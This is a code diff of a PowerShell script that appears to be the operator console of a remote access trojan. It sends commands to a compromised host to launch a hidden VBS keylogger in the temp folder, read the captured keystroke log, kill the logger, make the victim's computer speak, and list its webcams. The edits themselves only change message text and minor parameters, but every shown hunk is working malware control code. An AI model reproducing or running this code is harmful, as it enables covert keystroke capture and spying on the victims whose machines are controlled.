@@ -779,12 +779,12 @@ While($Client.Connected)
         $hour = Get-Date -Format hh;$minuts = Get-Date -Format mm;
         $second = Get-Date -Format ss;$peter_time = "$hour"+":"+"$minuts"+":"+"$second";
         write-host " Start Recording Remote-Host keystrokes" -ForeGroundColor blue -BackGroundColor white;Start-Sleep -Seconds 1;write-host "`n`n";
-        $Command = "`$1=`"`$env:tmp\KB4524147.vbs`";If([System.IO.File]::Exists(`"`$1`")){cmd /R start /min %tmp%\KB4524147.vbs;echo `"   Keylogger Running on: $Remote_Host (Time: $peter_time) ..`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force}else{echo `"   NOT FOUND: `$env:tmp\KB4524147.vbs..`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force}";
+        $Command = "`$1=`"`$env:tmp\KB4524147.vbs`";If([System.IO.File]::Exists(`"`$1`")){cmd /R start /min %tmp%\KB4524147.vbs;echo `"   [i] Keylogger Running on: $Remote_Host (Time: $peter_time) ..`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force}else{echo `"   [i] NOT FOUND: `$env:tmp\KB4524147.vbs..`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force}";
       }
       If($choise -eq "ReadLog" -or $choice -eq "readlog")
       {
         write-host " Read Remote-Host Keystrokes LogFile" -ForeGroundColor blue -BackGroundColor white;Start-Sleep -Seconds 1;write-host "`n`n";
-        $Command = "`$1=`"`$env:tmp\KBlogger.txt`";If([System.IO.File]::Exists(`"`$1`")){Get-Content `$env:tmp\KBlogger.txt;`> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force}else{echo `"   NOT FOUND: `$env:tmp\KBlogger.txt ..`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force}";
+        $Command = "`$1=`"`$env:tmp\KBlogger.txt`";If([System.IO.File]::Exists(`"`$1`")){Get-Content `$env:tmp\KBlogger.txt;`> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force}else{echo `"   [i] NOT FOUND: `$env:tmp\KBlogger.txt ..`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force}";
       }
       If($choise -eq "StopKP" -or $choise -eq "stopkp")
       {
@@ -796,7 +796,7 @@ While($Client.Connected)
           ## cmd /R taskkill /F /IM $Proc_name | cmd /R powershell Stop-Process -Processname powershell
           write-host " Stop Recording Remote-Host keystrokes (Stop PS Processes)." -ForeGroundColor Blue -BackGroundColor white;write-host "`n`n";
           $webroot = Test-Path -Path "$env:LocalAppData\webroot\";If($webroot -eq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\"};
-          $Command = "`$1=`"`$env:tmp\keylooger.ps1`";If([System.IO.File]::Exists(`"`$1`")){powershell Stop-Process -Processname powershell}else{echo `"   NOT FOUND: `$env:tmp\keylooger.ps1 ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";Start-Sleep -Seconds 1;
+          $Command = "`$1=`"`$env:tmp\keylooger.ps1`";If([System.IO.File]::Exists(`"`$1`")){powershell Stop-Process -Processname powershell}else{echo `"   [i] NOT FOUND: `$env:tmp\keylooger.ps1 ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";Start-Sleep -Seconds 1;
         }else{
           $sure = $Null;
           $File = $Null;
@@ -1124,7 +1124,7 @@ While($Client.Connected)
         If(-not ($MYSpeak -eq $False -or $MYSpeak -eq ""))
         {
           write-host "`n";
-          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -4;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
         }else{
           write-host "`n`n";
           write-host " [ERROR] Abort, None Frase Inputed by User .." -ForegroundColor Red -BackgroundColor White;write-host "`n";Start-Sleep -Seconds 3;
@@ -1612,9 +1612,9 @@ While($Client.Connected)
         {
           If($Cam_set -eq "True")
           {
-            $OutPut = $OutPut -replace "`n","";
-            write-host "`n`n  WebCam(s) Detected" -ForeGroundColor Green;
-            write-host "  ------------------";
+            $OutPut = $OutPut|findstr /s /C:"Device name:";
+            write-host "`n`n    WebCam(s) Detected" -ForeGroundColor Green;
+            write-host "    ------------------";
             Write-Host "  $OutPut";
             $Cam_set = "False";
           }else{
